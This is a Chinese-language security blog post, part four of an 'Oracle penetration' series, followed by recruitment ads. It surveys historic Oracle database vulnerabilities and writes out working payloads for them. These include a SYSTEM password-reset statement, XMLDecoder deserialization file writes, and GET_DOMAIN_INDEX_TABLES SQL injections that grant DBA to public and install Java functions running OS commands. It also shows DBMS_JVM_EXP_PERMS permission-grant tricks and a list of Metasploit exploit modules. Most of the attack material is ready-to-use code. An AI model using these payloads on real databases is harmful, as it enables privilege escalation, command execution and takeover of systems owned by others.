> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/dK6CCFXBmTt530AM0jZOFQ)

**STATEMENT**

**声明**

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测及文章作者不为此承担任何责任。

雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

_👇点击阅读第一、二、三章内容_

[**Oracle 渗透利用（一）**](http://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&mid=2652492016&idx=1&sn=65dda868965a025bb78c2f4e6bb3ec9e&chksm=f2587343c52ffa55f3162b9aca445a2b7441b587d7b4157a1abdc976368c0bb63a92fb7ed84c&scene=21#wechat_redirect)

[**Oracle 渗透利用（二）**](http://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&mid=2652492148&idx=1&sn=49c2ecc215b7c8b34f41c6006c6e9ae2&chksm=f25872c7c52ffbd124be3487bf664633de406057082643f18f9555a526556695c8ad527a398c&scene=21#wechat_redirect)

[**Oracle 渗透利用（三）**](http://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&mid=2652492186&idx=1&sn=efe14853bdb8525f3fe328c6d7cb23c9&chksm=f2587229c52ffb3f9b6596571ff751b036091772e758ff3eb8755f287296bec96151fe3fe742&scene=21#wechat_redirect)

前面的几章中主要介绍了 Oracle 的体系结构、Oracle Java 支持、Oracle CLR、Oracle SQL 注入技巧和 Oracle 命令执行技巧，本章将介绍 Oracle 历史漏洞。

**Oracle 历史漏洞**

(溢出的洞就不看了)

**CVE-2012-3137 Protocol Authentication Bypass**

一句话来说，是离线密码破解，从 odat 的 stealremotepwds 模块和 nmap 的 oracle-brute-stealth.nse 脚本可以看出，大概的利用思路是嗅探正确的密码登录数据包，然后进行离线密码破解

影响范围：

Oracle Database 11g Release 1 and 11g Release 2

**CVE-2012-1675 TNS poisoning**

无需认证的情况下，为目标服务器增加一个负载均衡服务器，从而劫持一部分客户端对目标服务器的访问，结合 CVE-2012-3137 可能会比较有用

影响范围：11.2.0.4 即以前

CVE-2012-3137 CVE-2012-1675 结合利用可能会比较好，但是实战中比较难利用

**CVE-2014-4237**

看描述和 payload 应该是一个密码重置

搜到的 payload，待分析和测试

需要重启，应该有风险，靶机已经打坏一次（也可能是其他 bug）

```
#oracle exploit #CVE-2014-4237 update(with tmp as(select * from sys.user$)select*from tmp)set password='D4DF7931AB130E37'where name='SYSTEM'
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWnRz381yk4mpeJFnicDkICJ0r3kfASUzefororIhVpXC3bqcetUBpSFJcfGctOJr93dK0DwzeXgYQ/640?wx_fmt=png)

**CVE-2018-3004 Oracle Database Privilege Escalation via XML Deserialization**

利用反序列化操作执行命令或者写文件。但是由于 Oracle JVM 实现了基于细粒度策略的安全性来控制对 OS 和文件系统的访问，因此该方法将不起作用。从低权限帐户执行此过程会导致错误。因此我们可以通过 XML 反序列化来进行文件的读写

1、创建 java 反序列化的 class 类

```
CREATE OR REPLACE AND COMPILE JAVA SOURCE named ExploitDecode AS 
import java.io.*;
import java.beans.*;
public class ExploitDecode{
  public static void input(String xml) throws InterruptedException, IOException {      
    XMLDecoder decoder = new XMLDecoder(new ByteArrayInputStream(xml.getBytes()));      
    Object object = decoder.readObject();      
    System.out.println(object.toString());      
    decoder.close();
    }
}
```

2、创建 java 存储过程

```
CREATE OR REPLACE PROCEDURE exploitdecode (p_xml IN VARCHAR2) IS language java name 'ExploitDecode.input(java.lang.String)';
```

3、通过 xmldecode 反序列化写入文件

```
BEGIN exploitdecode('<java class="java.beans.XMLDecoder" version="1.4.0" >
<object class="java.io.FileWriter">
                      <string>/tmp/111</string>
                      <boolean>True</boolean>
                      <void method="write">
                         <string>11</string>
                      </void>
                      <void method="close" />
                   </object>
                </java>');
                END;
```

**Oracle 存储过程（函数）注入**

默认情况下，存储过程是以定义者的权限执行的，这可以认为是以下的存储过程注入漏洞产生的原因，如果想让存储过程以调用者的权限的执行，需要在创建存储过程时，显示的声明 AUTHID CURRENT_USER。

**定义者权限执行**

**调用者权限执行**

删除存储过程 DROP PROCEDURE 存储过程名字

删除函数 DROP FUNCTION 函数名字

删除触发器 DROP TRIGGER 触发器名字

DROP JAVA CLASS "My Class";

查看当前用户：

select * from user_procedures;

或者

select * from user_objects where object_type='PROCEDURE';-- 一定要大写

查看所有用户（注意有查询权限）

select * from all_procedures;

或者

select * from all_objects where object_type='PROCEDURE';

查看存储过程代码

```
SELECT text
    FROM user_source
   WHERE NAME = 'EXPLOITDECODE'
ORDER BY line;
```

msf 中的 EXP

```
Oracle DB SQL Injection via SYS.DBMS_CDC_IPUBLISH.ALTER_HOTLOG_INTERNAL_CSOURCE
Oracle DB SQL Injection via SYS.DBMS_CDC_PUBLISH.ALTER_AUTOLOG_CHANGE_SOURCE
Oracle DB SQL Injection via SYS.DBMS_CDC_PUBLISH.DROP_CHANGE_SOURCE
Oracle DB SQL Injection via SYS.DBMS_CDC_PUBLISH.CREATE_CHANGE_SET
Oracle DB SQL Injection via SYS.DBMS_CDC_SUBSCRIBE.ACTIVATE_SUBSCRIPTION
Oracle DB SQL Injection via DBMS_EXPORT_EXTENSION
Oracle DB SQL Injection via SYS.DBMS_METADATA.GET_GRANTED_XML
Oracle DB SQL Injection via SYS.DBMS_METADATA.GET_XML
Oracle DB SQL Injection via SYS.DBMS_METADATA.OPEN
Oracle DB SQL Injection in MDSYS.SDO_TOPO_DROP_FTBL Trigger
Oracle DB 10gR2, 11gR1/R2 DBMS_JVM_EXP_PERMS OS Command Execution
Oracle DB 11g R1/R2 DBMS_JVM_EXP_PERMS OS Code Execution
Oracle DB SQL Injection via SYS.LT.COMPRESSWORKSPACE
Oracle DB SQL Injection via SYS.LT.FINDRICSET Evil Cursor Method
Oracle DB SQL Injection via SYS.LT.MERGEWORKSPACE
Oracle DB SQL Injection via SYS.LT.REMOVEWORKSPACE
Oracle DB SQL Injection via SYS.LT.ROLLBACKWORKSPACE
```

**GET_DOMAIN_INDEX_TABLES 函数注入**

影响版本:

Oracle 8.1.7.4, 9.2.0.1 - 9.2.0.7, 10.1.0.2 - 10.1.0.4, 10.2.0.1-10.2.0.2

漏洞的成因是该函数的参数存在注入，而该函数的所有者是 sys，所以通过注入就可以执行任意 sql，该函数的执行权限为 public，所以只要遇到一个 oracle 的注入点并且存在这个漏洞的，基本上都可以提升到最高权限。

一、权限提升

```
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS _OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant dba to public'''';END;'';END;--','SYS',0,'1',0) from dual
```

二、创建 Java 代码执行命令

```
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named "Command" as import java.io.*;public class Command{public static String exec(String cmd) throws Exception{String sb="";BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());BufferedReader inBr = new BufferedReader(new InputStreamReader(in));String lineStr;while ((lineStr = inBr.readLine()) != null)sb+=lineStr+"\n";inBr.close();in.close();return sb;}}'''';END;'';END;--','SYS',0,'1',0) from dual
```

三、赋予 Java 执行权限

```
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission( ''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''', ''''''''<<ALL FILES>>'''''''', ''''''''execute'''''''' );end;'''';END;'';END;--','SYS',0,'1',0) from dual
```

四、创建函数

```
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function cmd(p_cmd in varchar2) return varchar2 as language java name ''''''''Command.exec(java.lang.String) return String''''''''; '''';END;'';END;--','SYS',0,'1',0) from dual
```

五、赋予函数执行权限

```
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on cmd to public'''';END;'';END;--','SYS',0,'1',0) from dual
```

六、执行命令

```
select sys.cmd('cmd.exe /c whoami') from dual
```

另外如果不是 dba 权限但是具有 java.io.FilePermission 可以使用漏洞函数执行命令

1、尝试赋予 java.io.FilePermission 权限

```
DECLARE POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;CURSOR C1 IS SELECT 'GRANT',USER(), 'SYS','java.io.FilePermission','<<ALL FILES>>','execute','ENABLED' from dual;BEGIN OPEN C1;FETCH C1 BULK COLLECT INTO POL;CLOSE C1;DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);END;
```

2、利用漏洞函数执行命令

```
select dbms_java.runjava('oracle/aurora/util/Wrapper c:\\\\windows\\\\system32\\\\cmd.exe /c  command}')from dual
```

**Oracle11g 命令执行**

oracle 11.2.0.4 以下版本

创建 java Source

select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate''create or replace and compile java source named "AAA" as import java.io.*; public class AAA extends Object {public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;} catch (Exception e){return e.toString();}}}'';commit;end;') from dual;

创建 java function

select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate''create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name ''''AAA.runCMD(java.lang.String) return String''''; '';commit;end;') from dual;

查看 java function 及 java source 是否创建成功 都成功会出现 3 个内容 AAA java source, AAA java class, LinxRunCMD function

select object_name, object_type, created from user_objects ORDER BY CREATED desc;

赋予 java.io.FilePermission 权限

select dbms_xmlquery.newcontext('DECLARE POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY; CURSOR C1 IS SELECT''GRANT'',USER(),''SYS'',''java.io.FilePermission'',''<<ALL FILES>>'',''execute'',''ENABLED''from dual; BEGIN OPEN C1; FETCH C1 BULK COLLECT INTO POL; CLOSE C1; DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL); END;') from dual

查看权限是否赋予成功

select * from user_java_policy where grantee_name='TEST';  grantee_name 为当前用户的权限。

执行命令

select LinxRunCMD('id') from dual

**Oracle10g 命令执行**

https://redn3ck.github.io/2018/04/25/Oracle%E6%B3%A8%E5%85%A5-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Shell%E5%8F%8D%E5%BC%B9/

https://www.buaq.net/go-28792.html

**参考链接**

**微信读书《oracle 从入门到精通》《oracle11g 宝典》中体系结构 数据字典 权限控制相关章节**

https://hackingprofessional.github.io/Security/how-to-hack-an-Oracle-database-server/

https://www.cnblogs.com/qingxinblog/p/4043173.html  

**C++ 使用 oci 连接 oracle**

http://blog.chinaunix.net/uid-21592001-id-3271863.html

**oracle CLR**

https://docs.oracle.com/cd/B28359_01/win.111/b28376/intro.htm

https://docs.oracle.com/cd/B19306_01/B14251_01/adfns_extern_proc.htm#ADFNS010  
http://ora-600.pl/art/oracle_privilege_escalation.pdf

https://www.freebuf.com/articles/database/54289.html

http://www.davidlitchfield.com/Privilege_Escalation_via_Oracle_Indexes.pdf

**alert session**

https://docs.oracle.com/database/121/SQLRF/statements_2015.htm#SQLRF53047

**oracle 权限控制**

https://docs.oracle.com/en/database/oracle/oracle-database/21/dbseg/configuring-privilege-and-role-authorization.html#GUID-89CE989D-C97F-4CFD-941F-18203090A1AC

https://docs.oracle.com/en/database/oracle/oracle-database/21/sqlrf/GRANT.html#GUID-20B4E2C0-A7F8-4BC8-A5E8-BE61BDC41AC3

**Github 开源了一个较为全面的 Oracle 渗透工具：**

https://github.com/quentinhardy/odat/releases/

**ODAT 能够枚举 SID、账户密码、命令执行等等，通过查看**

https://github.com/quentinhardy/odat/blob/master-python3/DbmsScheduler.py 发现了一个从 Oracle 11g 往后的版本都支持的内置软件包 DBMS_SCHEDULER。

**ODAT 的测试截图**

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWnRz381yk4mpeJFnicDkICJ55deK4Cteyhvp7AU9K7qxia517icppWibWKaqnRs1MYW3iaQ5Ficz1DiaMhw/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWnRz381yk4mpeJFnicDkICJaAJI8Xz5gA8HxOfQ8UwEUraJKbXfMBcV8HHs8j5AicfwZmSaib6EPlyQ/640?wx_fmt=png)

漏洞利用不靠谱

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWnRz381yk4mpeJFnicDkICJQ3RTGLH9fP5j9P7VXTPSVGNIRQaP7D7M3HYzLu52g4peLVk7OyMFeg/640?wx_fmt=png)

👇点击阅读前面内容  

[**Oracle 渗透利用（一）**](http://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&mid=2652492016&idx=1&sn=65dda868965a025bb78c2f4e6bb3ec9e&chksm=f2587343c52ffa55f3162b9aca445a2b7441b587d7b4157a1abdc976368c0bb63a92fb7ed84c&scene=21#wechat_redirect)

[**Oracle 渗透利用（二）**](http://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&mid=2652492148&idx=1&sn=49c2ecc215b7c8b34f41c6006c6e9ae2&chksm=f25872c7c52ffbd124be3487bf664633de406057082643f18f9555a526556695c8ad527a398c&scene=21#wechat_redirect)

[**Oracle 渗透利用（三）**](http://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&mid=2652492186&idx=1&sn=efe14853bdb8525f3fe328c6d7cb23c9&chksm=f2587229c52ffb3f9b6596571ff751b036091772e758ff3eb8755f287296bec96151fe3fe742&scene=21#wechat_redirect)

**RECRUITMENT**

**招聘启事**

**安恒雷神众测 SRC 运营（实习生）**  
————————  
【职责描述】  
1.  负责 SRC 的微博、微信公众号等线上新媒体的运营工作，保持用户活跃度，提高站点访问量；  
2.  负责白帽子提交漏洞的漏洞审核、Rank 评级、漏洞修复处理等相关沟通工作，促进审核人员与白帽子之间友好协作沟通；  
3.  参与策划、组织和落实针对白帽子的线下活动，如沙龙、发布会、技术交流论坛等；  
4.  积极参与雷神众测的品牌推广工作，协助技术人员输出优质的技术文章；  
5.  积极参与公司媒体、行业内相关媒体及其他市场资源的工作沟通工作。  
【任职要求】   
 1.  责任心强，性格活泼，具备良好的人际交往能力；  
 2.  对网络安全感兴趣，对行业有基本了解；  
 3.  良好的文案写作能力和活动组织协调能力。

简历投递至 

bountyteam@dbappsecurity.com.cn

**设计师（实习生）**  

————————

【职位描述】  
负责设计公司日常宣传图片、软文等与设计相关工作，负责产品品牌设计。  
【职位要求】  
1、从事平面设计相关工作 1 年以上，熟悉印刷工艺；具有敏锐的观察力及审美能力，及优异的创意设计能力；有 VI 设计、广告设计、画册设计等专长；  
2、有良好的美术功底，审美能力和创意，色彩感强；

3、精通 photoshop/illustrator/coreldrew / 等设计制作软件；  
4、有品牌传播、产品设计或新媒体视觉工作经历；  
【关于岗位的其他信息】  
企业名称：杭州安恒信息技术股份有限公司  
办公地点：杭州市滨江区安恒大厦 19 楼  
学历要求：本科及以上  
工作年限：1 年及以上，条件优秀者可放宽

简历投递至 

bountyteam@dbappsecurity.com.cn

安全招聘  

————————  
公司：安恒信息  
岗位：**Web 安全 安全研究员**  
部门：战略支援部  
薪资：13-30K  
工作年限：1 年 +  
工作地点：杭州（总部）、广州、成都、上海、北京

工作环境：一座大厦，健身场所，医师，帅哥，美女，高级食堂…  
【岗位职责】  
1. 定期面向部门、全公司技术分享;  
2. 前沿攻防技术研究、跟踪国内外安全领域的安全动态、漏洞披露并落地沉淀；  
3. 负责完成部门渗透测试、红蓝对抗业务;  
4. 负责自动化平台建设  
5. 负责针对常见 WAF 产品规则进行测试并落地 bypass 方案  
【岗位要求】  
1. 至少 1 年安全领域工作经验；  
2. 熟悉 HTTP 协议相关技术  
3. 拥有大型产品、CMS、厂商漏洞挖掘案例；  
4. 熟练掌握 php、java、asp.net 代码审计基础（一种或多种）  
5. 精通 Web Fuzz 模糊测试漏洞挖掘技术  
6. 精通 OWASP TOP 10 安全漏洞原理并熟悉漏洞利用方法  
7. 有过独立分析漏洞的经验，熟悉各种 Web 调试技巧  
8. 熟悉常见编程语言中的至少一种（Asp.net、Python、php、java）  
【加分项】  
1. 具备良好的英语文档阅读能力；  
2. 曾参加过技术沙龙担任嘉宾进行技术分享；  
3. 具有 CISSP、CISA、CSSLP、ISO27001、ITIL、PMP、COBIT、Security+、CISP、OSCP 等安全相关资质者；  
4. 具有大型 SRC 漏洞提交经验、获得年度表彰、大型 CTF 夺得名次者；  
5. 开发过安全相关的开源项目；  
6. 具备良好的人际沟通、协调能力、分析和解决问题的能力者优先；  
7. 个人技术博客；  
8. 在优质社区投稿过文章；

岗位：**安全红队武器自动化工程师**  
薪资：13-30K  
工作年限：2 年 +  
工作地点：杭州（总部）  
【岗位职责】  
1. 负责红蓝对抗中的武器化落地与研究；  
2. 平台化建设；  
3. 安全研究落地。  
【岗位要求】  
1. 熟练使用 Python、java、c/c++ 等至少一门语言作为主要开发语言；  
2. 熟练使用 Django、flask 等常用 web 开发框架、以及熟练使用 mysql、mongoDB、redis 等数据存储方案；  
3: 熟悉域安全以及内网横向渗透、常见 web 等漏洞原理；  
4. 对安全技术有浓厚的兴趣及热情，有主观研究和学习的动力；  
5. 具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
【加分项】  
1. 有高并发 tcp 服务、分布式等相关经验者优先；  
2. 在 github 上有开源安全产品优先；  
3: 有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4. 在 freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5. 具备良好的英语文档阅读能力。

简历投递至

bountyteam@dbappsecurity.com.cn

岗位：**红队武器化 Golang 开发工程师**  

薪资：13-30K  
工作年限：2 年 +  
工作地点：杭州（总部）  
【岗位职责】  
1. 负责红蓝对抗中的武器化落地与研究；  
2. 平台化建设；  
3. 安全研究落地。  
【岗位要求】  
1. 掌握 C/C++/Java/Go/Python/JavaScript 等至少一门语言作为主要开发语言；  
2. 熟练使用 Gin、Beego、Echo 等常用 web 开发框架、熟悉 MySQL、Redis、MongoDB 等主流数据库结构的设计, 有独立部署调优经验；  
3. 了解 docker，能进行简单的项目部署；  
3. 熟悉常见 web 漏洞原理，并能写出对应的利用工具；  
4. 熟悉 TCP/IP 协议的基本运作原理；  
5. 对安全技术与开发技术有浓厚的兴趣及热情，有主观研究和学习的动力，具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
【加分项】  
1. 有高并发 tcp 服务、分布式、消息队列等相关经验者优先；  
2. 在 github 上有开源安全产品优先；  
3: 有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4. 在 freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5. 具备良好的英语文档阅读能力。  
简历投递至

bountyteam@dbappsecurity.com.cn

END

![图片](https://mmbiz.qpic.cn/mmbiz_gif/CtGxzWjGs5uX46SOybVAyYzY0p5icTsasu9JSeiaic9ambRjmGVWuvxFbhbhPCQ34sRDicJwibicBqDzJQx8GIM3AQXQ/640?wx_fmt=gif)

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JX1av2ACppVAI0QeqjSPTdCPpJXkaYMAlxSH7KZtiblmPBzy8TjXL6vRyAZRNJgVBwTUrkryxAJUaw/640?wx_fmt=jpeg)

![图片](https://mmbiz.qpic.cn/mmbiz_gif/0BNKhibhMh8eiasiaBAEsmWfxYRZOZdgDBevusQUZzjTCG5QB8B4wgy8TSMiapKsHymVU4PnYYPrSgtQLwArW5QMUA/640?wx_fmt=gif)

**长按识别二维码关注我们**